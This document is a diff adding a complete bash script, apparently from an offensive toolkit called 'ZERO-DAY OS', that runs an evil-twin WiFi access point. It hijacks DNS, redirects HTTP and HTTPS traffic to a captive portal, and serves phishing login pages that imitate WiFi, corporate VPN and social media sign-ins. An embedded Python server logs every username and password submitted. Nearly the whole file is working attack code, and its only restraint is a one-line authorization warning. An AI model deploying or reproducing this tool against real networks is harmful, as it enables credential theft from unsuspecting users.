@@ -1,0 +1,405 @@
+#!/bin/bash
+# /usr/local/bin/wifi-evil-twin
+# Rogue access point with captive portal for credential harvesting
+# Creates a fake WiFi network, intercepts DNS, and serves a login page
+# Usage: wifi-evil-twin <ap_iface> <inet_iface> <essid> [portal_type]
+#
+# Portal types:
+#   wifi     — Fake "WiFi login" page (default)
+#   corporate — Fake "Corporate VPN" page
+#   social   — Fake "Social media" page
+#   custom   — Serve your own HTML from /opt/cardputer/config/captive/
+#
+# WARNING: Only use on networks you own or have authorization to test.
+
+AP_IFACE="${1:-wlan0}"
+INET_IFACE="${2:-eth0}"
+ESSID="${3:-FreeWiFi}"
+PORTAL="${4:-wifi}"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[!] Root required."
+    exit 1
+fi
+
+mkdir -p "$LOOT"
+
+echo "[*] ZERO-DAY OS — Evil Twin Access Point + Captive Portal"
+echo "[*] AP Interface: $AP_IFACE"
+echo "[*] Internet Interface: $INET_IFACE"
+echo "[*] ESSID: $ESSID"
+echo "[*] Portal Type: $PORTAL"
+echo ""
+
+if ! ip link show "$AP_IFACE" &>/dev/null; then
+    echo "[!] AP interface $AP_IFACE not found."
+    echo "[!] If using dual-WiFi, the dongle should be wlan1."
+    echo "[!] Try: wifi-evil-twin wlan1 eth0 '$ESSID'"
+    exit 1
+fi
+
+if ! ip link show "$INET_IFACE" &>/dev/null; then
+    echo "[!] Internet interface $INET_IFACE not found."
+    echo "[!] Available interfaces:"
+    ip -br link show
+    exit 1
+fi
+
+if iw dev "$AP_IFACE" info 2>/dev/null | grep -q "monitor"; then
+    echo "[*] Switching $AP_IFACE to managed mode..."
+    ip link set "$AP_IFACE" down
+    iw dev "$AP_IFACE" set type managed
+    ip link set "$AP_IFACE" up
+fi
+
+rfkill unblock wifi 2>/dev/null
+
+AP_IP="10.0.0.1"
+AP_DHCP_START="10.0.0.2"
+AP_DHCP_END="10.0.0.50"
+AP_NETMASK="255.255.255.0"
+PORTAL_DIR="/opt/cardputer/config/captive"
+CAPTIVE_LOG="$LOOT/captive_creds_${TIMESTAMP}.log"
+
+mkdir -p "$PORTAL_DIR"
+
+# Generate captive portal HTML
+generate_portal() {
+    local TYPE="$1"
+    local DEST="$2"
+
+    case "$TYPE" in
+        wifi)
+            cat > "$DEST/index.html" << 'HTMLEOF'
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WiFi Login Required</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+.card { background: white; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 32px; width: 100%; max-width: 360px; }
+.wifi-icon { text-align: center; font-size: 48px; margin-bottom: 16px; }
+h1 { font-size: 20px; text-align: center; margin-bottom: 8px; color: #333; }
+p { font-size: 14px; color: #666; text-align: center; margin-bottom: 24px; }
+label { display: block; font-size: 13px; color: #555; margin-bottom: 4px; font-weight: 500; }
+input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; margin-bottom: 16px; }
+input:focus { outline: none; border-color: #1976d2; box-shadow: 0 0 0 3px rgba(25,118,210,0.1); }
+button { width: 100%; padding: 14px; background: #1976d2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+button:hover { background: #1565c0; }
+.footer { text-align: center; margin-top: 16px; font-size: 12px; color: #999; }
+.error { color: #d32f2f; font-size: 14px; text-align: center; margin-bottom: 16px; display: none; }
+</style>
+</head>
+<body>
+<div class="card">
+<div class="wifi-icon">📶</div>
+<h1>WiFi Login Required</h1>
+<p>Please sign in to access the network.</p>
+<div class="error" id="err">Invalid username or password. Please try again.</div>
+<form method="POST" action="/login">
+<label for="username">Username or Email</label>
+<input type="text" id="username" name="username" placeholder="user@email.com" required>
+<label for="password">Password</label>
+<input type="password" id="password" name="password" placeholder="Password" required>
+<button type="submit">Connect</button>
+</form>
+<div class="footer">Network provided by your ISP</div>
+</div>
+</body>
+</html>
+HTMLEOF
+            ;;
+        corporate)
+            cat > "$DEST/index.html" << 'HTMLEOF'
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Corporate VPN Login</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a237e; display: flex; justify-content: center; align-items: center; height: 100vh; }
+.card { background: white; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); padding: 32px; width: 100%; max-width: 380px; }
+.logo { text-align: center; font-size: 36px; margin-bottom: 16px; }
+h1 { font-size: 18px; text-align: center; margin-bottom: 4px; color: #1a237e; }
+.sub { font-size: 13px; color: #666; text-align: center; margin-bottom: 24px; }
+label { display: block; font-size: 13px; color: #555; margin-bottom: 4px; font-weight: 500; }
+input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; margin-bottom: 14px; }
+input:focus { outline: none; border-color: #1a237e; }
+button { width: 100%; padding: 14px; background: #1a237e; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; }
+button:hover { background: #283593; }
+.warn { text-align: center; margin-top: 16px; font-size: 11px; color: #999; }
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">🔒</div>
+<h1>Secure Remote Access</h1>
+<p class="sub">Corporate VPN Gateway — Authentication Required</p>
+<form method="POST" action="/login">
+<label for="username">Corporate Username</label>
+<input type="text" id="username" name="username" placeholder="domain\username" required>
+<label for="password">Password</label>
+<input type="password" id="password" name="password" placeholder="Corporate password" required>
+<button type="submit">Sign In</button>
+</form>
+<div class="warn">Unauthorized access is prohibited. All connections are monitored.</div>
+</div>
+</body>
+</html>
+HTMLEOF
+            ;;
+        social)
+            cat > "$DEST/index.html" << 'HTMLEOF'
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Social Login</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+.card { background: white; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px; width: 100%; max-width: 340px; }
+h1 { font-size: 16px; text-align: center; margin-bottom: 16px; color: #262626; }
+.form-group { margin-bottom: 12px; }
+label { display: block; font-size: 13px; color: #666; margin-bottom: 4px; }
+input { width: 100%; padding: 10px 12px; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; background: #fafafa; }
+input:focus { outline: none; border-color: #a8a8a8; }
+button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+button:hover { background: #0081d6; }
+.divider { text-align: center; margin: 16px 0; color: #999; font-size: 13px; }
+.forgot { text-align: center; margin-top: 16px; font-size: 12px; color: #00376b; }
+</style>
+</head>
+<body>
+<div class="card">
+<h1>Sign in to continue</h1>
+<form method="POST" action="/login">
+<div class="form-group">
+<label>Phone number, username, or email</label>
+<input type="text" name="username" placeholder="Username">
+</div>
+<div class="form-group">
+<label>Password</label>
+<input type="password" name="password" placeholder="Password">
+</div>
+<button type="submit">Log In</button>
+</form>
+<div class="divider">OR</div>
+<div class="forgot">Forgot password?</div>
+</div>
+</body>
+</html>
+HTMLEOF
+            ;;
+        custom)
+            if [ ! -f "$PORTAL_DIR/index.html" ]; then
+                echo "[!] No custom portal found at $PORTAL_DIR/index.html"
+                echo "[!] Creating a template..."
+                mkdir -p "$PORTAL_DIR"
+                cp /dev/stdin "$PORTAL_DIR/index.html" << 'HTMLEOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Login</title></head>
+<body style="font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">
+<div style="padding:20px;border:1px solid #ccc;border-radius:8px;max-width:320px;">
+<h2 style="text-align:center;">Login</h2>
+<form method="POST" action="/login">
+<input type="text" name="username" placeholder="Username" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;"><br>
+<input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;"><br>
+<button type="submit" style="width:100%;padding:10px;background:#333;color:white;border:none;border-radius:4px;">Submit</button>
+</form>
+</div>
+</body></html>
+HTMLEOF
+            fi
+            cp "$PORTAL_DIR/index.html" "$DEST/index.html"
+            ;;
+    esac
+}
+
+# Create captive portal log handler
+create_logger() {
+    cat > "$PORTAL_DIR/logger.py" << 'PYEOF'
+#!/usr/bin/env python3
+"""Captive portal credential logger for ZERO-DAY OS evil twin"""
+import http.server, socketserver, urllib.parse, os, sys, datetime
+
+LOG_FILE = os.environ.get("CAPTIVE_LOG", "/tmp/captive_creds.log")
+PORTAL_DIR = os.environ.get("PORTAL_DIR", ".")
+
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path in ["/", "/index.html", "/login", "/captive"]:
+            self.send_response(302)
+            self.send_header("Location", "/index.html")
+            self.end_headers()
+        else:
+            super().do_GET()
+
+    def do_POST(self):
+        if self.path == "/login":
+            content_length = int(self.headers.get("Content-Length", 0))
+            post_data = self.request.rfile.read(content_length).decode("utf-8")
+            params = urllib.parse.parse_qs(post_data)
+
+            username = params.get("username", [""])[0]
+            password = params.get("password", [""])[0]
+
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            client_ip = self.client_address[0]
+
+            log_entry = f"[{timestamp}] {client_ip} - Username: {username} Password: {password}\n"
+            
+            with open(LOG_FILE, "a") as f:
+                f.write(log_entry)
+
+            print(f"\033[32m[+] CAPTURED: {username}:{password} from {client_ip}\033[0m")
+            sys.stdout.flush()
+
+            # Redirect to "success" page
+            self.send_response(302)
+            self.send_header("Location", "/success.html")
+            self.end_headers()
+
+            # Create success page
+            with open(os.path.join(PORTAL_DIR, "success.html"), "w") as f:
+                f.write("""<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connected</title><style>*{margin:0;padding:0}body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
+.card{text-align:center;padding:32px;background:white;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
+.icon{font-size:48px;margin-bottom:16px}h1{color:#4caf50;margin-bottom:8px}p{color:#666}</style></head>
+<body><div class="card"><div class="icon">✅</div><h1>Connected!</h1><p>You are now connected to the network.</p></div></body></html>""")
+        else:
+            self.send_error(404)
+
+    def log_message(self, format, *args):
+        pass  # Suppress default logging
+
+os.chdir(PORTAL_DIR)
+handler = CaptivePortalHandler
+with socketserver.TCPServer(("", 80), handler) as httpd:
+    httpd.serve_forever()
+PYEOF
+    chmod +x "$PORTAL_DIR/logger.py"
+}
+
+# Setup hostapd
+generate_portal "$PORTAL" "$PORTAL_DIR"
+create_logger
+
+HOSTAPD_CONF=$(mktemp)
+DNSMASQ_CONF=$(mktemp)
+
+cat > "$HOSTAPD_CONF" << EOF
+interface=$AP_IFACE
+driver=nl80211
+ssid=$ESSID
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=zerodayhack
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+EOF
+
+cat > "$DNSMASQ_CONF" << EOF
+interface=$AP_IFACE
+dhcp-range=$AP_DHCP_START,$AP_DHCP_END,$AP_NETMASK,12h
+dhcp-option=3,$AP_IP
+dhcp-option=6,$AP_IP
+address=/#/$AP_IP
+log-queries
+log-dhcp
+log-facility=$LOOT/dns_queries_${TIMESTAMP}.log
+EOF
+
+echo "[*] Configuring $AP_IFACE with IP $AP_IP..."
+ip addr flush dev "$AP_IFACE"
+ip addr add "$AP_IP/24" dev "$AP_IFACE"
+ip link set "$AP_IFACE" up
+
+echo "[*] Starting hostapd..."
+hostapd -B "$HOSTAPD_CONF"
+
+sleep 2
+
+echo "[*] Starting dnsmasq (DHCP + DNS hijack)..."
+dnsmasq -C "$DNSMASQ_CONF"
+
+echo "[*] Starting captive portal server on port 80..."
+export CAPTIVE_LOG="$CAPTIVE_LOG"
+export PORTAL_DIR="$PORTAL_DIR"
+python3 "$PORTAL_DIR/logger.py" &
+LOGGER_PID=$!
+
+echo "[*] Enabling NAT..."
+iptables -t nat -A POSTROUTING -o "$INET_IFACE" -j MASQUERADE
+iptables -A FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT
+iptables -A FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80
+iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+echo ""
+echo "╔══════════════════════════════════════════════════╗"
+echo "║  EVIL TWIN + CAPTIVE PORTAL ACTIVE               ║"
+echo "║                                                  ║"
+echo "║  ESSID: $ESSID"
+echo "║  AP IP:  $AP_IP"
+echo "║  Password: zerodayhack"
+echo "║  Portal:  $PORTAL"
+echo "║                                                  ║"
+echo "║  Credentials will appear below as captured:       ║"
+echo "║  [+] CAPTURED: username:password from IP          ║"
+echo "║                                                  ║"
+echo "║  Log file: $CAPTIVE_LOG"
+echo "║  DNS log:  $LOOT/dns_queries_${TIMESTAMP}.log"
+echo "║                                                  ║"
+echo "║  Press Ctrl+C to stop                           ║"
+echo "╚══════════════════════════════════════════════════╝"
+echo ""
+
+cleanup() {
+    echo ""
+    echo "[*] Stopping Evil Twin..."
+    kill "$LOGGER_PID" 2>/dev/null
+    kill $(pgrep -f "hostapd.*$AP_IFACE") 2>/dev/null
+    kill $(pgrep -f "dnsmasq.*$AP_IFACE") 2>/dev/null
+    iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null
+    iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null
+    iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null
+    iptables -F FORWARD 2>/dev/null
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+    ip addr flush dev "$AP_IFACE"
+    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
+    echo "[+] Evil Twin stopped."
+    echo "[+] Credentials saved: $CAPTIVE_LOG"
+    if [ -f "$CAPTIVE_LOG" ]; then
+        echo ""
+        echo "[*] Captured credentials:"
+        cat "$CAPTIVE_LOG"
+    fi
+    exit 0
+}
+
+trap cleanup INT TERM
+
+# Monitor for connections
+while true; do
+    if [ -f "/var/lib/misc/dnsmasq.leases" ]; then
+        CLIENTS=$(wc -l < "/var/lib/misc/dnsmasq.leases" 2>/dev/null || echo "0")
+        if [ "$CLIENTS" -gt 0 ]; then
+            printf "\r[*] Connected clients: %d   " "$CLIENTS"
+        fi
+    fi
+    sleep 5
+done
